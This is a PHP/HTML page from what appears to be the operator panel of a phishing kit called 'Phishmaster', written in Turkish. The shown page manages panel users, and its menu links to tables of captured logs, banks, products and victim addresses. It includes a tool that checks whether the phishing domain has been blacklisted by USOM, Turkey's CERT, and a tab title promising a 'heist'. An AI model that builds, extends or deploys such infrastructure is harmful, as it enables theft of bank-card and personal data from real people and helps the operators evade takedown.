<?php include_once("../config.php"); include_once("./Data/Server/GrabIP.php"); include_once("./function/MainFunction.php"); include_once("./Data/Client/GetBank.php"); giris_dogrulama($pdo);

  $QueryServer = $pdo->query("SELECT * FROM admin_settings")->fetch(PDO::FETCH_ASSOC);
  $QueryAdmin = $pdo->query("SELECT * FROM admin WHERE ip_adresi = '{$ip}'")->fetch(PDO::FETCH_ASSOC);
  $user_check = $pdo->query("SELECT * FROM admin")->fetch(PDO::FETCH_ASSOC);

  $adminKullaniciSQL = $pdo->query("SELECT COUNT(*) FROM admin");
  $kullanici_sayisi = $adminKullaniciSQL->fetchColumn();

  if($QueryServer["ip_filter"] == 1) {
    if(!in_array($ip, $ip_filter_config)) {
      die("IP Firewall - monke");
    }
  }

  if($QueryAdmin['yetki'] != "Superadmin") {
    header('Location: main');
  }

  if($_POST) {
    if($_POST['kullanici_adi']) {
      if(!empty($_POST['kullanici_adi']) and isset($_SESSION['giris_yapildi'])) {
        $stmt = $pdo->prepare('INSERT INTO admin SET kullanici_adi = ?, sifre = ?, yetki = ?, son_gorulme = ?');
        $stmt->execute([ $_POST['kullanici_adi'], password_hash($_POST['sifre'], PASSWORD_DEFAULT), $_POST['yetki-check'], '00.00.0000 00:00:00' ]);
        $stmt2 = $pdo->prepare('INSERT INTO action_history SET kullanici_adi = ?, yetki = ?, ip_adresi = ?, son_islem = ?');
        $stmt2->execute([ $QueryAdmin['kullanici_adi'], $QueryAdmin['yetki'], $QueryAdmin['ip_adresi'], $QueryAdmin['kullanici_adi'].', isimli kullanıcı '.$_POST['kullanici_adi'].' ismiyle yeni bir kullanıcı oluşturdu!' ]);
        header('Location: user');
        exit;
      }
    } else if($_POST['kullanici_id']) {
      if(!empty($_POST['kullanici_id']) and isset($_SESSION['giris_yapildi']) and $kullanici_sayisi >= 2) {
        $stmt1 = $pdo->prepare('DELETE FROM admin WHERE id = ?');
        $stmt1->execute([ $_POST['kullanici_id'] ]);
        $stmt2 = $pdo->prepare('INSERT INTO action_history SET kullanici_adi = ?, yetki = ?, ip_adresi = ?, son_islem = ?');
        $stmt2->execute([ $QueryAdmin['kullanici_adi'], $QueryAdmin['yetki'], $QueryAdmin['ip_adresi'], $QueryAdmin['kullanici_adi'].', isimli kullanıcı ID #'.$_POST['kullanici_id'].' kullanıcısını sildi!' ]);
        header('Location: user');
        exit;
      }
    }
  }
?>
<!doctype html>
<html lang="tr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>monke - Kullanıcı Yönetimi</title>
    <meta name="description" content="monke Panel">
    <meta name="author" content="monke">
    <meta name="robots" content="noindex, nofollow">
    
    <meta property="og:title" content="monke Panel">
    <meta property="og:site_name" content="Developed monke">
    <meta property="og:description" content="monke Panel">
    <meta property="og:type" content="website">

    <link rel="shortcut icon" href="assets/media/favicons/favicon.png">
    <link rel="icon" type="image/png" sizes="192x192" href="assets/media/favicons/favicon-192x192.png">
    <link rel="apple-touch-icon" sizes="180x180" href="assets/media/favicons/apple-touch-icon-180x180.png">
    <link rel="stylesheet" id="css-main" href="assets/css/oneui.min.css">
    <link rel="stylesheet" href="assets/js/plugins/datatables-bs5/css/dataTables.bootstrap5.min.css">
  </head>
  <body>
    <div id="page-container" class="sidebar-o sidebar-light enable-page-overlay side-scroll page-header-fixed remember-theme">
      <nav id="sidebar" aria-label="Main Navigation">
        <div class="content-header">
          <a class="fw-semibold text-dual" href="main">
            <span class="smini-visible">
              <i class="fa-solid fa-crosshairs text-primary"></i>
            </span>
            <span class="smini-hide fs-5 tracking-wider">Phish<span class="fw-normal">master</span></span>
          </a>
          <div>
            <button type="button" class="btn btn-sm btn-alt-secondary" data-toggle="layout" data-action="dark_mode_toggle">
              <i class="fa fa-moon"></i>
            </button>
            <div class="dropdown d-inline-block ms-1">
              <button type="button" class="btn btn-sm btn-alt-secondary" id="sidebar-themes-dropdown" data-bs-toggle="dropdown" data-bs-auto-close="outside" aria-haspopup="true" aria-expanded="false">
                <i class="fa fa-brush"></i>
              </button>
              <div class="dropdown-menu dropdown-menu-end fs-sm smini-hide border-0" aria-labelledby="sidebar-themes-dropdown">
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="default">
                  <span>Varsayılan</span>
                  <i class="fa fa-circle text-default"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/amethyst.min.css">
                  <span>Stil 1</span>
                  <i class="fa fa-circle text-amethyst"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/city.min.css">
                  <span>Stil 2</span>
                  <i class="fa fa-circle text-city"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/flat.min.css">
                  <span>Stil 3</span>
                  <i class="fa fa-circle text-flat"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/modern.min.css">
                  <span>Stil 4</span>
                  <i class="fa fa-circle text-modern"></i>
                </button>
                <button type="button" class="dropdown-item d-flex align-items-center justify-content-between fw-medium" data-toggle="theme" data-theme="assets/css/themes/smooth.min.css">
                  <span>Stil 5</span>
                  <i class="fa fa-circle text-smooth"></i>
                </button>
              </div>
            </div>
            <a class="d-lg-none btn btn-sm btn-alt-secondary ms-1" data-toggle="layout" data-action="sidebar_close" href="javascript:void(0)">
              <i class="fa fa-fw fa-times"></i>
            </a>
          </div>
        </div>
        <div class="js-sidebar-scroll">
          <div class="content-side">
            <ul class="nav-main">
              <li class="nav-main-item">
                <a class="nav-main-link" href="main">
                  <i class="nav-main-link-icon si si-speedometer"></i>
                  <span class="nav-main-link-name">Anasayfa</span>
                </a>
              </li>
              <li class="nav-main-heading">PHISHING</li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="logs">
                  <i class="nav-main-link-icon si si-credit-card"></i>
                  <span class="nav-main-link-name">Log Tablosu</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="bans">
                  <i class="nav-main-link-icon si si-ban"></i>
                  <span class="nav-main-link-name">Ban Tablosu</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="banks">
                  <i class="nav-main-link-icon fa fa-bank"></i>
                  <span class="nav-main-link-name">Banka Tablosu</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="urunler">
                  <i class="nav-main-link-icon fa fa-cart-shopping"></i>
                  <span class="nav-main-link-name">Ürün Tablosu</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="address">
                  <i class="nav-main-link-icon fa fa-map"></i>
                  <span class="nav-main-link-name">Adres Tablosu</span>
                </a>
              </li>
              <li class="nav-main-heading">ARACLAR</li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="javascript:void(0);" id="check_usom">
                  <i class="nav-main-link-icon fa fa-check-double"></i>
                  <span class="nav-main-link-name">USOM Kontrolü</span>
                </a>
              </li>
              <?php if($QueryAdmin['yetki'] == "Superadmin"): ?>
              <li class="nav-main-heading">YONETIM</li>
              <li class="nav-main-item">
                <a class="nav-main-link active" href="user">
                  <i class="nav-main-link-icon si si-people"></i>
                  <span class="nav-main-link-name">Kullanıcı Yönetimi</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="action_history">
                  <i class="nav-main-link-icon si si-list"></i>
                  <span class="nav-main-link-name">İşlem Geçmişi</span>
                </a>
              </li>
              <li class="nav-main-item">
                <a class="nav-main-link" href="javascript:void(0);" id="factory_reset">
                  <i class="nav-main-link-icon fa-solid fa-wrench"></i>
                  <span class="nav-main-link-name">Fabrika Ayarları</span>
                </a>
              </li>
              <?php endif; ?>
            </ul>
          </div>
        </div>
      </nav>
      <header id="page-header">
        <div class="content-header">
          <div class="d-flex align-items-center">
            <button type="button" class="btn btn-sm btn-alt-secondary me-2 d-lg-none" data-toggle="layout" data-action="sidebar_toggle">
              <i class="fa fa-fw fa-bars"></i>
            </button>
            <button type="button" class="btn btn-sm btn-alt-secondary me-2 d-none d-lg-inline-block" data-toggle="layout" data-action="sidebar_mini_toggle">
              <i class="fa fa-fw fa-ellipsis-v"></i>
            </button>
          </div>
          <div class="d-flex align-items-center">
            <div class="dropdown d-inline-block ms-2">
              <button type="button" class="btn btn-sm btn-alt-secondary d-flex align-items-center" id="page-header-user-dropdown" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <img class="rounded-circle" src="assets/media/avatars/avatar0.jpg" style="width: 21px;">
                <span class="d-none d-sm-inline-block ms-2"><?php echo $QueryAdmin['kullanici_adi']; ?></span>
                <i class="fa fa-fw fa-angle-down d-none d-sm-inline-block opacity-50 ms-1 mt-1"></i>
              </button>
              <div class="dropdown-menu dropdown-menu-md dropdown-menu-end p-0 border-0" aria-labelledby="page-header-user-dropdown">
                <div class="p-3 text-center bg-body-light border-bottom rounded-top">
                  <p class="mt-2 mb-0 fw-medium"><?php echo $QueryAdmin['kullanici_adi']; ?></p>
                  <p class="mb-0 text-muted fs-sm fw-medium"><?php echo $QueryAdmin['yetki']; ?></p>
                </div>
                <div class="p-2">
                  <a class="dropdown-item d-flex align-items-center justify-content-between" href="settings">
                    <span class="fs-sm fw-medium">Ayarlar</span>
                  </a>
                  <a class="dropdown-item d-flex align-items-center justify-content-between" href="quit">
                    <span class="fs-sm fw-medium">Çıkış Yap</span>
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </header>
      <main id="main-container">
        <div class="bg-body-light">
          <div class="content content-full">
            <div class="d-flex flex-column flex-sm-row justify-content-sm-between align-items-sm-center py-2">
              <div class="flex-grow-1">
                <h1 class="h3 fw-bold mb-2"> Kullanıcı Yönetimi </h1>
                <h2 class="fs-base lh-base fw-medium text-muted mb-0">
                    <?php echo $mesaj; ?> <a class="link-fx" href="javascript:void(0)"><?php echo $QueryAdmin['kullanici_adi']; ?></a>, bu sayfa sayesinde paneldeki kullanıcıları yönetebilirsin.
                </h2>
              </div>
              <nav class="flex-shrink-0 mt-3 mt-sm-0 ms-sm-3" aria-label="breadcrumb">
                <ol class="breadcrumb breadcrumb-alt">
                  <li class="breadcrumb-item">
                    <a class="link-fx" href="javascript:void(0)">Yönetim</a>
                  </li>
                  <li class="breadcrumb-item" aria-current="page"> Kullanıcı Yönetimi </li>
                </ol>
              </nav>
            </div>
          </div>
        </div>
        <div class="content">
          <div class="col-12">
            <div class="block block-rounded row g-0">
              <ul class="nav nav-tabs nav-tabs-block flex-md-column col-md-4 col-xxl-2" role="tablist">
                <li class="nav-item d-md-flex flex-md-column">
                  <button class="nav-link text-md-start active" id="kullanici-olustur-buton" data-bs-toggle="tab" data-bs-target="#kullanici-olustur" role="tab" aria-controls="kullanici-olustur" aria-selected="true">
                    <i class="fa fa-fw fa-user-plus opacity-50 me-1 d-none d-sm-inline-block"></i>
                    <span>Kullanıcı Oluştur</span>
                    <span class="d-none d-md-block fs-xs fw-medium opacity-75 mt-md-2">
                      Panele yetkili kullanıcı hesabı oluşturabilirsin.
                    </span>
                  </button>
                </li>
                <li class="nav-item d-md-flex flex-md-column">
                  <button class="nav-link text-md-start" id="kullanici-sil-buton" data-bs-toggle="tab" data-bs-target="#kullanici-sil" role="tab" aria-controls="kullanici-sil" aria-selected="false">
                    <i class="fa fa-fw fa-user-minus opacity-50 me-1 d-none d-sm-inline-block"></i>
                    <span>Kullanıcı Sil</span>
                    <span class="d-none d-md-block fs-xs fw-medium opacity-75 mt-md-2">
                      Panele eklediğin kullanıcı hesaplarını silebilirsin.
                    </span>
                  </button>
                </li>
                <li class="nav-item d-md-flex flex-md-column">
                  <button class="nav-link text-md-start" id="kullanici-tablosu-buton" data-bs-toggle="tab" data-bs-target="#kullanici-tablosu" role="tab" aria-controls="kullanici-tablosu" aria-selected="false">
                    <i class="fa fa-fw fa-table opacity-50 me-1 d-none d-sm-inline-block"></i>
                    <span>Kullanıcı Tablosu</span>
                    <span class="d-none d-md-block fs-xs fw-medium opacity-75 mt-md-2">
                      Panele eklediğin kullanıcı hesaplarını listeleyebilirsin.
                    </span>
                  </button>
                </li>
              </ul>
              <div class="tab-content col-md-8 col-xxl-10">
                <div class="block-content tab-pane active" id="kullanici-olustur" role="tabpanel" aria-labelledby="kullanici-olustur-buton" tabindex="0">
                  <h4 class="fw-semibold">Kullanıcı Oluştur</h4>
                  <form method="POST" class="kullanici-ekle">
                    <div class="mb-2 col-md-4">
                      <label class="form-label" for="kullanici_adi">Kullanıcı Adı</label>
                      <input type="text" class="form-control" id="kullanici_adi" name="kullanici_adi" placeholder="Kullanıcı Adı">
                    </div>
                    <div class="mb-2 col-md-4">
                      <label class="form-label" for="sifre">Şifre</label>
                      <input type="password" class="form-control" id="sifre" name="sifre" placeholder="Şifre">
                    </div>
                    <div class="mb-4">
                      <label class="form-label">Yetki</label>
                      <div class="space-x-2">
                        <div class="form-check form-check-inline">
                          <input class="form-check-input" type="radio" id="superadmin-rank" name="yetki-check" value="Superadmin">
                          <label class="form-check-label" for="superadmin-rank">Superadmin</label>
                        </div>
                        <div class="form-check form-check-inline">
                          <input class="form-check-input" type="radio" id="user-rank" name="yetki-check" value="User" checked>
                          <label class="form-check-label" for="user-rank">User</label>
                        </div>
                      </div>
                    </div>
                    <div class="mb-3">
                      <button type="submit" class="btn btn-sm btn-success">
                        <i class="fa fa-fw fa-plus me-1"></i> Kullanıcı Oluştur
                      </button>
                      <button type="button" onclick="SifreOlustur();" class="btn btn-sm btn-success">
                      <i class="fa-solid fa-repeat me-1"></i> Şifre Oluştur
                      </button>
                    </div>
                  </form>
                </div>
                <div class="block-content tab-pane" id="kullanici-sil" role="tabpanel" aria-labelledby="kullanici-sil-buton" tabindex="0">
                  <h4 class="fw-semibold">Kullanıcı Sil</h4>
                  <form method="POST" class="kullanici-sil">
                    <div class="mb-4 col-md-4">
                      <label class="form-label" for="kullanici_id">Kullanıcı ID</label>
                      <input type="text" class="form-control" id="kullanici_id" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1').replace(/^0[^.]/, '0');" name="kullanici_id" placeholder="Kullanıcı ID">
                    </div>
                    <div class="mb-3">
                      <button type="submit" class="btn btn-sm btn-danger">
                        <i class="fa fa-fw fa-times me-1"></i> Kullanıcı Sil
                      </button>
                    </div>
                  </form>
                </div>
                <div class="block-content tab-pane" id="kullanici-tablosu" role="tabpanel" aria-labelledby="kullanici-tablosu-buton" tabindex="0">
                  <h4 class="fw-semibold">Kullanıcı Tablosu</h4>
                  <div class="block-content block-content-full">
                     <table class="table table-bordered table-striped table-vcenter js-dataTable-responsive">
                        <thead>
                        <tr>
                            <th class="text-center fw-light fs-sm" style="width: 20%;"><i class="fa-regular fa-id-card"></i> ID</th>
                            <th class="text-center fw-light fs-sm" style="width: 20%;"><i class="fa-regular fa-user"></i> KULLANICI ADI</th>
                            <th class="text-center fw-light fs-sm" style="width: 20%;"><i class="fa-solid fa-ranking-star"></i> YETKİ</th>
                            <th class="text-center fw-light fs-sm" style="width: 20%;"><i class="fa-regular fa-compass"></i> IP ADRESI</th>
                            <th class="text-center fw-light fs-sm" style="width: 20%;"><i class="fa-solid fa-right-to-bracket"></i> SON GİRİŞ</th>
                          </tr>
                        </thead>
                        <tbody>
                        <?php foreach($pdo->query('SELECT * FROM admin') as $yazdir) { ?>
                          <tr>
                          <td class="text-center fw-normal fs-sm"><a href="javascript:void(0)" class="Kopyala" data-clipboard-text="<?php echo htmlspecialchars($yazdir['id']); ?>"><?php echo $yazdir['id']; ?></a></td>
                            <td class="text-center fw-normal fs-sm"><?php if(htmlspecialchars($yazdir['kullanici_adi'])): ?><a href="javascript:void(0)" class="Kopyala" data-clipboard-text="<?php echo htmlspecialchars($yazdir['kullanici_adi']); ?>"><?php echo htmlspecialchars($yazdir['kullanici_adi']); ?></a><?php endif; ?></td>
                            <td class="text-center fw-normal fs-sm"><?php echo $yazdir['yetki']; ?></td>
                            <td class="text-center fw-normal fs-sm"><a href="https://db-ip.com/<?php echo $yazdir['ip_adresi'];?>" target="_blank"><?php echo htmlspecialchars($yazdir['ip_adresi']);?></a></td>
                            <td class="text-center fw-normal fs-sm"><?php echo htmlspecialchars($yazdir['son_gorulme']); ?></td>
                          </tr>
                        <?php } ?>
                        </tbody>
                     </table>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>
      <footer id="page-footer" class="bg-body-light">
        <div class="content py-3">
          <div class="row fs-sm">
            <div class="col-sm-6 order-sm-2 py-1 text-center text-sm-end"> Kullanıcı: <a class="fw-semibold link-fx" href="javascript:void(0)"><?php echo $QueryAdmin['kullanici_adi']; ?></a>
            </div>
            <div class="col-sm-6 order-sm-1 py-1 text-center text-sm-start">
              <a class="fw-semibold link-fx" href="javascript:void(0)">monke</a> &copy; <span data-toggle="year-copy"></span>
            </div>
          </div>
        </div>
      </footer>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.10/dist/clipboard.min.js"></script>
    <script type="text/javascript">
      document.getElementById("check_usom").addEventListener("click", function(e) {
        var domain = window.location.host;

        One.helpers('jq-notify', {type: 'warning', icon: 'fa fa-rotate me-1', message: 'USOM kontrolü yapılıyor!'});

        e.preventDefault();
        
        $.ajax({
          type: "POST",
          url: "./function/CheckUsom.php",
          data: {
            domain: domain
          },
          success: function (data) {
            if(data === "yasaklandi") {
              One.helpers('jq-notify', {type: 'danger', icon: 'fa fa-times me-1', message: "Domain USOM tarafından yasaklanmış durumda."});
            } else if(data === "yasaklanmadi") {
              One.helpers('jq-notify', {type: 'success', icon: 'fa fa-check me-1', message: "Domain USOM tarafından yasaklanmadı."});
            } else if(data === "baglanti hatasi") {
              One.helpers('jq-notify', {type: 'danger', icon: 'fa fa-check me-1', message: "USOM ile bağlantı kurulamadı!"});
            }
          }
        });
      });
      var title = document.title;
      var alttitle = "Vurgun için bekleniyorsun ;)";
      window.onblur = function () { 
        document.title = alttitle;
      };
      window.onfocus = function () { 
        document.title = title;
      };

      var clipboard = new ClipboardJS('.Kopyala');

      clipboard.on('success', function (e) {
        One.helpers('jq-notify', {type: 'success', icon: 'fa fa-check me-1', message: 'Panoya kopyalama işlemi başarılı!'});
      });

      clipboard.on('error', function (e) {
        One.helpers('jq-notify', {type: 'danger', icon: 'fa fa-times me-1', message: 'Panoya kopyalama işlemi başarısız!'});
      });

      function SifreOlustur() {
        One.helpers('jq-notify', {type: 'success', icon: 'fa fa-check me-1', message: 'Şifre oluşturma işlemi başarılı!'});
        document.getElementById("sifre").value = SifreOlusturMain()
        document.getElementById("sifre").select();
        document.getElementById("sifre").setSelectionRange(0, 99999);
        navigator.clipboard.writeText(document.getElementById("sifre").value);
      }
      document.getElementById("factory_reset").addEventListener("click", function(e) {
        Swal.fire({
          title: 'Emin misin?',
          text: "Bu işlemi geri alamıyacaksın ve bütün veriler silinecektir!",
          icon: 'warning',
          showCancelButton: true,
          confirmButtonColor: '#3085d6',
          cancelButtonColor: '#d33',
          confirmButtonText: 'Evet',
          cancelButtonText: 'Hayır'
        }).then((result) => {
          if (result.isConfirmed) {
            e.preventDefault();
            $.ajax({
              type: "POST",
              url: "./function/FactoryReset.php",
              data: {
                izin: true
              },
              success: function (data) {
                Swal.fire({
                  title: 'İşlem Başarılı!',
                  text: "Bütün veriler başarıyla silindi.",
                  icon: 'success',
                  confirmButtonColor: '#3085d6',
                  confirmButtonText: 'Tamam'
                }).then((result) => {
                  if (result.isConfirmed) {
                    window.location.href = 'quit';
                  }
                })
              }
            });
          }
        })
      });
      function SifreOlusturMain( len ) {
        var length = (len)?(len):(10);
        var string = "abcdefghijklmnopqrstuvwxyz";
        var numeric = '0123456789';
        var punctuation = '!@#$%^&*~`?><=';
        var password = "";
        var character = "";
        var crunch = true;
        while( password.length<length ) {
            entity1 = Math.ceil(string.length * Math.random()*Math.random());
            entity2 = Math.ceil(numeric.length * Math.random()*Math.random());
            entity3 = Math.ceil(punctuation.length * Math.random()*Math.random());
            hold = string.charAt( entity1 );
            hold = (password.length%2==0)?(hold.toUpperCase()):(hold);
            character += hold;
            character += numeric.charAt( entity2 );
            character += punctuation.charAt( entity3 );
            password = character;
        }
        password = password.split('').sort(function(){return 0.5-Math.random()}).join('');
        return password.substr(0,len);
      }
      
      
    </script>
    <script src="assets/js/oneui.app.min.js"></script>
    <script src="assets/js/lib/jquery.min.js"></script>
    <script src="assets/js/plugins/jquery-validation/jquery.validate.min.js"></script>
    <script src="assets/js/pages/kullanici-ekle.min.js"></script>
    <script src="assets/js/pages/kullanici-sil.min.js"></script>
    <script src="assets/js/plugins/bootstrap-notify/bootstrap-notify.min.js"></script>
    <script src="assets/js/plugins/datatables/jquery.dataTables.min.js"></script>
    <script src="assets/js/plugins/datatables-bs5/js/dataTables.bootstrap5.min.js"></script>
    <script src="assets/js/plugins/datatables-buttons/dataTables.buttons.min.js"></script>
    <script src="assets/js/pages/datatable.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script>One.helpersOnLoad(['jq-notify']);</script>
  </body>
</html>